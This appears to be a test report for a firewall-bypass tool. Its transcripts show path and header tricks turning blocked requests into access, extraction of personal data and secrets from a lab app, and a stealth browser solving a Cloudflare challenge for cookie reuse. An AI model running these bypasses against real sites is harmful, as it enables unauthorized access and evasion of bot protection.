# Limitation test matrix

Date: 2026-11-22. Host: macOS arm64, Python 3.13.15. Every block below is a
verbatim transcript; screenshots are rendered from those exact files by
`tools/shot.py`.

| Old limitation | Now | Evidence |
|---|---|---|
| No HTTP/2, no SETTINGS/priority/pseudo-header control | `h2.py` frame + HPACK layer, `--http2 <profile>`, `--mode h2` | `2-h2-header.png`, `3-h2-size.png`, `6-h2-real.png` |
| No redirect following / cookie minting | `--follow N`, `--cookies` | `4-follow-cookies.png` |
| Challenge page reported as BLOCKED | `CHALLENGE` verdict + solver path | `5-challenge-verdict.png`, `7-solver-e2e.png` |
| Body cap fixed at 1 MiB | `--max-body BYTES` | `6-h2-real.png` (50000-byte baseline) |
| Silent masking when control == baseline | `[!] soft-404 masking` warning | `3-h2-size.png` transcript in TEST-REPORT |
| No TLS knobs | `--ciphers`, `--tls-min`, `--tls-max`, `--alpn` | below |

## 1. h1 escalation ladder (offline sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/admin.php?id=1 --mode all --level 4 -t 4 --repeat 1
[+] SUMMARY variants=72 bypass=12 blocked=56 notfound=3 diff=1 error=0 unstable=0 challenge=0
[+] BYPASS rows: path/double-slash(200), ... method/method-OPTIONS(200)
```

Screenshot: `screenshots/1-h1-levels.png`.

## 2. HTTP/2 header bypass (offline h2c sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8098/admin.php --http2 chrome --mode header --level 2 -t 2 --repeat 1
[*] transport h2 (ALPN h2) profile=chrome follow=0 cookies=False
[*] baseline GET /admin.php -> 403 / 18 bytes  "403 Blocked by WAF"
[+] SUMMARY variants=9 bypass=4 blocked=5 notfound=0 diff=0 error=0 unstable=0 challenge=0
[+] BYPASS rows: header/xff-127.0.0.1(200), header/xff-localhost(200), header/x-original-url(200), header/x-rewrite-url(200)
```

Screenshot: `screenshots/2-h2-header.png`.

## 3. HTTP/2 data flow + size window (offline h2c sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8098/submit --http2 plain --mode size --profile generic --preset sqli -t 2 --repeat 1
[+] SUMMARY variants=4 bypass=2 blocked=2 notfound=0 diff=0 error=0 unstable=0 challenge=0
[!] stability: 2/2 confirmed
[+] BYPASS rows: size/size-8192(200), size/size-65536(200)
```

Screenshot: `screenshots/3-h2-size.png`.

## 4. Redirect following + cookie jar (offline h1 sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/redirect --follow 2 --cookies --mode path --level 1 -t 2 --repeat 1
[*] transport h1 follow=2 cookies=True
[*] baseline GET /redirect -> 403 / 18 bytes  "403 Blocked by WAF"
```

The raw `/redirect` answers 302 with `Set-Cookie: minted=1`; with `--follow`
the baseline lands on `/admin`, which the WAF blocks, so the run compares
variants against a blocked baseline instead of a 302.

Screenshot: `screenshots/4-follow-cookies.png`.

## 5. Challenge verdict (offline h1 sim)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/challenge --mode path --level 1 -t 2 --repeat 1
[!] baseline is a JS/CAPTCHA challenge (cf-mitigated); rerun with --solve-challenge to mint cookies in a browser
[+] SUMMARY variants=4 bypass=0 blocked=0 notfound=1 diff=0 error=0 unstable=0 challenge=3
```

Screenshot: `screenshots/5-challenge-verdict.png`.

## 6. h2 over real TLS + configurable cap

```
$ python3 wafbypass.py -u https://www.wikipedia.org --http2 firefox --mode h2 --max-body 50000 -t 2 --timeout 10 --repeat 0
[*] transport h2 (ALPN h2) profile=firefox follow=0 cookies=False
[*] baseline GET / -> 200 / 50000 bytes
[+] SUMMARY variants=10 bypass=0 blocked=10 notfound=0 diff=0 error=0 unstable=0 challenge=0
```

The same run also completed against `https://www.cloudflare.com` (h2, Huffman
+ dynamic table HPACK, 10/10 variants decoded, 0 errors). `nginx.org` refuses
ALPN `h2` (`tlsv1 alert no application protocol`), which the tool reports as
a baseline failure instead of pretending.

Screenshot: `screenshots/6-h2-real.png`.

## 7. Cloudflare challenge solve + cookie reuse

Solver worker (Scrapling stealth browser, real run):

```
$ .venv/bin/python challenge.py https://nopecha.com/demo/cloudflare 300
{"cookies": {"cf_clearance": "Ck8uhGTK...", "_gcl_au": "...", "_ga": "...", ...},
 "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ... Chrome/156.0.0.0 Safari/537.36",
 "status": 200, "final_url": "https://nopecha.com/demo", "title": "NopeCHA - CAPTCHA Demo",
 "challenge": false, "error": null}
```

Without the solver, the same URL is a challenge and is labelled as such:

```
$ python3 wafbypass.py -u https://nopecha.com/demo/cloudflare --follow 2 --mode path --level 1 -t 2 --timeout 20 --repeat 1
[*] baseline GET /demo/cloudflare -> 403 / 5717 bytes  "<!DOCTYPE html><html lang="en-US"><head><title>Just a moment..."
[!] baseline is a JS/CAPTCHA challenge (cf-mitigated); rerun with --solve-challenge to mint cookies in a browser
path      double-slash           GET    403     5717   CHALLENGE ...
[+] SUMMARY variants=4 bypass=0 blocked=0 notfound=2 diff=0 error=0 unstable=0 challenge=2
```

With the solver, the minted cookies + UA are injected into raw requests:

```
$ python3 wafbypass.py -u https://nopecha.com/demo/cloudflare --solve-challenge --follow 2 --mode path --level 1 -t 2 --timeout 20 --repeat 1
[*] transport h1 follow=2 cookies=True
[*] challenge solver cookies=6 status=200 title='NopeCHA - CAPTCHA Demo' solved=True
[*] baseline GET /demo/cloudflare -> 200 / 142880 bytes
[+] SUMMARY variants=4 bypass=0 blocked=4 notfound=0 diff=0 error=0 unstable=0 challenge=0
```

A full solve takes 2-5 minutes; `challenge.py` caches the jar in
`~/.cache/wafbypass/<netloc>.json` for 900 s, so the engine run above starts
from the cached clearance and finishes in seconds. `--solver-refresh` forces
a new browser solve.

Screenshots: `screenshots/7a-no-solver.png`, `screenshots/7-solver-e2e.png`.

## 9. Finding extraction after a bypass

Fixture `/users`: the mock WAF blocks the exact path `/users` (403); rewrite
variants reach the same app route, which returns a private directory.

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/users --mode path --level 2 -t 2 --repeat 1
[*] baseline GET /users -> 403 / 18 bytes  "403 Blocked by WAF"
[+] SUMMARY variants=13 bypass=10 blocked=0 notfound=3 diff=0 error=0 unstable=0 challenge=0
[i] impact: payload=0 access=0 unknown=10
[+] FINDINGS (baseline 403 -> bypass 200)
  severity=high title='User Directory' variants=10
    variants: path/double-slash, path/dot-segment, path/pct-dot, path/semicolon-suffix, path/trailing-dot, path/trailing-slash, +4 more
    emails  : andi.pratama@example.co.id, budi.santoso@example.co.id, sari.wulandari@example.co.id
    phones  : +6281234567890, +6281298765432, +6281311122233
    niks    : 327401****0001, 327401****0002, 327401****0003
    secrets : password, token
    excerpt: "password reset token: a1b2c3"
```

The JSON form carries the same data per row:

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/users --mode path --level 1 --json --repeat 0 \
    | jq -r '.rows[] | select(.verdict=="BYPASS") | [.variant,.status,.impact,.finding.emails,.finding.niks,.finding.phones] | @tsv'
double-slash  200  unknown  3  3  3
dot-segment   200  unknown  3  3  3
trailing-slash 200 unknown  3  3  3
```

Screenshot: `screenshots/9-finding-users.png`. Values are fixture data; the
rule itself (403 -> 200 with PII counts) is what the engine reports on any
target.

## 10. TLS knobs (real host)

```
$ python3 wafbypass.py -u https://www.wikipedia.org --ciphers ECDHE-RSA-AES128-GCM-SHA256 \
    --tls-min TLSv1_2 --tls-max TLSv1_3 --alpn http/1.1 --mode method --level 1 -t 2 --timeout 10 --repeat 0
[*] baseline GET / -> 200 / 122506 bytes
[+] SUMMARY variants=3 bypass=0 blocked=1 notfound=0 diff=2 error=0 unstable=0 challenge=0
```

Screenshot: `screenshots/8-tls-knobs.png`.

## 11. Real ModSecurity CRS lab (not a mock WAF)

Containers: `owasp/modsecurity-crs:nginx` in front of the fixture app, with
one policy rule denying `/users`:

```
SecRule REQUEST_URI "@beginsWith /users" "id:900001,phase:1,deny,status:403,log"
```

Direct checks: `/users` -> CRS `403`, `//users` -> app `200` (478 bytes,
"User Directory").

```
$ python3 wafbypass.py -u http://127.0.0.1:8080/users --mode path --level 2 -t 2 --repeat 2 --timeout 15
[*] baseline GET /users -> 403 / 18 bytes  "403 Blocked by WAF"
[+] SUMMARY variants=13 bypass=8 blocked=0 notfound=3 diff=2 error=0 unstable=0 challenge=0
[i] stability: 10/10 confirmed
[+] FINDINGS (baseline 403 -> bypass 200)
  severity=high title='User Directory' variants=10
    variants: path/double-slash, path/dot-segment, path/pct-dot, path/semicolon-suffix, path/trailing-dot, path/trailing-slash, +4 more
    emails  : andi.pratama@example.co.id, budi.santoso@example.co.id, sari.wulandari@example.co.id
    phones  : +6281234567890, +6281298765432, +6281311122233
    niks    : 327401****0001, 327401****0002, 327401****0003
    secrets : password, token
    excerpt: "password reset token: a1b2c3"
```

Real WAF, real 403 -> 200 transition, and the disclosed data is reported as
counts plus a text snippet. The app behind the WAF is the fixture, so emails,
NIKs and phones are synthetic values; the bypass and the finding extraction
are the engine's output.

Screenshot: `screenshots/11-crs-users.png`.

## 12. CRS signature sweeps (no policy rule)

`/echo` behind the same CRS, XSS preset, encoding family:

```
[*] baseline GET /echo?q=%3Cscript%3Ealert(1)%3C/script%3E -> 403 / 548 bytes
[+] SUMMARY variants=12 bypass=2 blocked=10 notfound=0 diff=0 error=0 unstable=0 challenge=0
[i] stability: 2/2 confirmed
[i] impact: payload=2 access=0 unknown=0
[+] BYPASS rows: encoding/enc-hex(200), encoding/enc-base64(200)
```

CRS lets hex/base64 through, but the app receives and echoes literal hex or
base64 — no tag executes. The impact oracle marks these `payload` because the
response changed, yet the finding shows `emails=0 niks=0 phones=0
sensitive=-`: a WAF signature gap without an exploit.

Screenshot: `screenshots/10-crs-echo.png`.

## 13. Welcome menu, interactive shell, responsive output

```
$ python3 wafbypass.py          # no args: banner + numbered menu
$ printf '0\n' | COLUMNS=100 python3 wafbypass.py
$ python3 wafbypass.py -i       # stays alive
waf403x> url http://127.0.0.1:8099/users
waf403x> mode path
waf403x> level 1
waf403x> repeat 1
waf403x> run
waf403x> quit
```

The menu is fully English and prints the level table before asking:
`1 obvious rewrite`, `2 one parser differential`, `3 double layer`,
`4 null/terminal framing`. Interactive `levels` prints the same table.

`--watch 1` on the same target produced five rendered frames in five seconds
(`timeout 5 ... ; grep -c FINDINGS` -> 5), each frame cleared and redrawn.

Width handling, same target:

```
$ COLUMNS=64  python3 wafbypass.py -u .../users --mode path --level 1 --repeat 1
MODE/VARIANT          METHOD STATUS BYTES VERDICT
path/double-slash GET 200 478 BYPASS
  "<html><head><title>User
  Directory</title></head><body><h1>Us..."

$ COLUMNS=130 python3 wafbypass.py -u .../users --mode path --level 1 --repeat 1
MODE      VARIANT                      METHOD STATUS BYTES   VERDICT   SNIPPET
path      double-slash                 GET    200    478     BYPASS    <html>...
...
[+] FINDINGS (baseline 403 -> bypass 200)
  severity=high title='User Directory' variants=3
    variants: path/double-slash, path/dot-segment, path/trailing-slash
    emails  : andi.pratama@example.co.id, budi.santoso@example.co.id, sari.wulandari@example.co.id
    phones  : +6281234567890, +6281298765432, +6281311122233
    niks    : 327401****0001, 327401****0002, 327401****0003
    secrets : password, token
    excerpt: "password reset token: a1b2c3"
```

Findings with identical disclosure are collapsed into one grouped block; the
snippet wraps to the terminal width.

Screenshots: `screenshots/12-menu.png`, `screenshots/13-interactive.png`,
`screenshots/14-responsive.png`.

## Residual gaps

* TLS extension order and TLS 1.3 suite selection remain OpenSSL-controlled.
* Image CAPTCHAs are not solved by the engine; the stealth browser handles
  Cloudflare interstitials/Turnstile only.
* No crawler: only the given URL, one control path, redirect hops and the
  solver page are requested.
